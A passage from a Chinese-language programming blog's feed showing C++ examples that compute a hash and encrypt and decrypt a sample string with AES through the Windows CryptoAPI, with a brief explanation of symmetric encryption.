pHashData)</span><br><span class="line">&#123;</span><br><span class="line">bRet = FALSE;</span><br><span class="line"><span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br><span class="line">RtlZeroMemory(pHashData, dwHashDataLength);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取HASH结果数据</span></span><br><span class="line">bRet = CryptGetHashParam(hCryptHash, HP_HASHVAL, pHashData, &amp;dwHashDataLength, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (FALSE == bRet)</span><br><span class="line">&#123;</span><br><span class="line">bRet = FALSE;</span><br><span class="line"><span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回数据</span></span><br><span class="line">*ppHashData = pHashData;</span><br><span class="line">*pdwHashDataLength = dwHashDataLength;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 释放关闭</span></span><br><span class="line"><span class="keyword">if</span> (FALSE == bRet)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (pHashData)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">delete</span>[]pHashData;</span><br><span class="line">pHashData = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (hCryptHash)</span><br><span class="line">&#123;</span><br><span class="line">CryptDestroyHash(hCryptHash);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (hCryptProv)</span><br><span class="line">&#123;</span><br><span class="line">CryptReleaseContext(hCryptProv, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>AES高级加密标准为最常见的对称加密算法，所谓对称加密算法也就是加密和解密使用相同密钥的加 密算法。AES为分组密码，分组密码也就是把明文分成一组一组的，每组长度相等，每次加密一组数据， 直到加密完整个明文。AES对称加密算法的优势在于算法公开，计算量小，加密效率高。</p><ul><li>获取加密服务提供程序的句柄</li><li>明文密钥的MD5值作为基础密钥通过调用CryptDeriveKey函数来派生出AES的加密密钥</li><li>在计算出明文密码的MD5值后，调用CryptDeriveKey函数来派生密钥。</li><li>完成派生密钥后，调用CryptEncrypt函数来根据派生密钥中指定的加密算法进行加密运算。</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function">BOOL <span class="title">AesEncrypt</span><span class="params">(BYTE *pPassword, DWORD dwPasswordLength, BYTE *pData, DWORD &amp;dwDataLength, DWORD dwBufferLength)</span></span>;</span><br><span class="line"><span class="function">BOOL <span class="title">AesDecrypt</span><span class="params">(BYTE *pPassword, DWORD dwPasswordLength, BYTE *pData, DWORD &amp;dwDataLength, DWORD dwBufferLength)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">BYTE pData[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">DWORD dwDataLength = <span class="number">0</span>, dwBufferLength = MAX_PATH;</span><br><span class="line">DWORD i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">RtlZeroMemory(pData, dwBufferLength);</span><br><span class="line">lstrcpy((<span class="keyword">char</span> *)pData, <span class="string">"AES DemoGan"</span>);</span><br><span class="line">dwDataLength = <span class="number">1</span> + lstrlen((<span class="keyword">char</span> *)pData);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Text[%d]\n"</span>, dwDataLength);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s "</span>, pData);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// AES 加密</span></span><br><span class="line">AesEncrypt((BYTE *)<span class="string">"yeanhoo"</span>, <span class="number">7</span>, pData, dwDataLength, dwBufferLength);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"AES Encrypt[%d]\n"</span>, dwDataLength);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s"</span>, pData);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// AES 解密</span></span><br><span class="line">AesDecrypt((BYTE *)<span class="string">"yeanhoo"</span>, <span class="number">7</span>, pData, dwDataLength, dwBufferLength);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"AES Decrypt[%d]\n"</span>, dwDataLength);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s "</span>, pData);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n\n"</span>);</span><br><span class="line"></span><br><span class="line">system(<span class="string">"pause"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">AesEncrypt</span><span class="params">(BYTE *pPassword, DWORD dwPasswordLength, BYTE *pData, DWORD &amp;dwDataLength, DWORD dwBufferLength)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">BOOL bRet = TRUE;</span><br><span class="line">HCRYPTPROV hCryptProv = <span class="literal">NULL</span>;</span><br><span class="line">HCRYPTHASH hCryptHash = <span class="literal">NULL</span>;</span><br><span class="line">HCRYPTKEY hCryptKey = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取CSP句柄</span></span><br><span class="line">bRet = CryptAcquireContext(&amp;hCryptProv, <span class="literal">NULL</span>, <span class="literal">NULL</span>, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);</span><br><span class="line"><span class="keyword">if</span> (FALSE == bRet)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建HASH对象</span></span><br><span class="line">bRet = CryptCreateHash(hCryptProv, CALG_MD5, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;hCryptHash);</span><br><span class="line"><span class="keyword">if</span> (FALSE == bRet)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对密钥进行HASH计算</span></span><br><span class="line">bRet = CryptHashData(hCryptHash, pPassword, dwPasswordLength, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (FALSE == bRet)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用HASH来生成密钥</span></span><br><span class="line">bRet = CryptDeriveKey(hCryptProv, CALG_AES_128, hCryptHash, CRYPT_EXPORTABLE, &amp;hCryptKey);</span><br><span class="line"><span class="keyword">if</span> (FALSE == bRet)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 加密数据</span></span><br><span class="line">bRet = CryptEncrypt(hCryptKey, <span class="literal">NULL</span>, TRUE, <span class="number">0</span>, pData, &amp;dwDataLength, dwBufferLength);</span><br><span class="line"><span class="keyword">if</span> (FALSE == bRet)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭释放</span></span><br><span class="line"><span class="keyword">if</span> (hCryptKey)</span><br><span class="line">&#123;</span><br><span class="line">CryptDestroyKey(hCryptKey);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (hCryptHash)</span><br><span class="line">&#123;</span><br><span class="line">CryptDestroyHash(hCryptHash);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (hCryptProv)</span><br><span class="line">&#123;</span><br><span class="line">CryptReleaseContext(hCryptProv, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">AesDecrypt</span><span class="params">(BYTE *pPassword, DWORD dwPasswordLength, BYTE *pData, DWORD &amp;dwDataLength, DWORD dwBufferLength)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">BOOL bRet = TRUE;</span><br><span class="line">HCRYPTPROV hCryptProv = <span class="literal">NULL</span>;</span><br><span class="line">HCRYPTHASH hCryptHash = <span class="literal">NULL</span>;</span><br><span class="line">HCRYPTKEY hCryptKey = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取CSP句柄</span></span><br><span class="line">bRet = CryptAcquireContext(&amp;hCryptProv, <span class="literal">NULL</span>, <span class="literal">NULL</span>, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);</span><br><span class="line"><span class="keyword">if</span> (FALSE == bRet)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建HASH对象</span></span><br><span class="line">bRet = CryptCreateHash(hCryptProv, CALG_MD5, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;hCryptHash);</span><br><span class="line"><span class="keyword">if</span> (FALSE == bRet)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对密钥进行HASH计算</span></span><br><span class="line">bRet = CryptHashData(hCryptHash, pPassword, dwPasswordLength, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (FALSE == bRet)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用HASH来生成密钥</span></span><br><span class="line">bRet = CryptDeriveKey(hCryptProv, CALG_AES_128, hCryptHash, CRYPT_EXPORTABLE, &amp;hCryptKey);</span><br><span class="line"><span class="keyword">if</span> (FALSE == bRet)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解密数据</span></span><br><span class="line">bRet = CryptDecrypt(hCryptKey, <span class="literal">NULL</span>, TRUE, <span class="number">0</span>, pData, &amp;dwDataLength);</span><br><span class="line"><span class="keyword">if</span> (FALSE == bRet)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭释放</span></span><br><span class="line"><span class="keyword">if</span> (hCryptKey)</span><br><span class="line">&#123;</span><br><span class="line">CryptDestroyKey(hCryptKey);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (hCryptHash)</span><br><span class="line">&#123;</span><br><span class="line">CryptDestroyHash(hCryptHash);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (hCryptProv)</span><br><span class="line">&#123;</span><br><span class="line">CryptReleaseContext(hCryptProv, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;HASH计算-amp-AES算法调用&quot;&gt;&lt;a href=&quot;#HASH计算-amp-AES算法调用&quot; class=&quot;headerlink&quot; title=&quot;HASH计算  &amp;amp;  AES算法调用&quot;&gt;&lt;/a&gt;HASH计算  &amp;amp;  AES算法调用&lt;/h2&gt;&lt;
      
    
    </summary>
    
    
      <category term="C\C++" scheme="http://yeanhoo.gitee.io/categories/C-C/"/>
    
    
      <category term="windows API" scheme="http://yeanhoo.gitee.io/tags/windows-API/"/>
    
      <category term="hash计算" scheme="http://yeanhoo.gitee.io/tags/hash%E8%AE%A1%E7%AE%97/"/>
    
      <category term="AES API调用" scheme="http://yeanhoo.gitee.io/tags/AES-API%E8%B0%83%E7%94%A8/"/>
    
  </entry>
  
</feed>
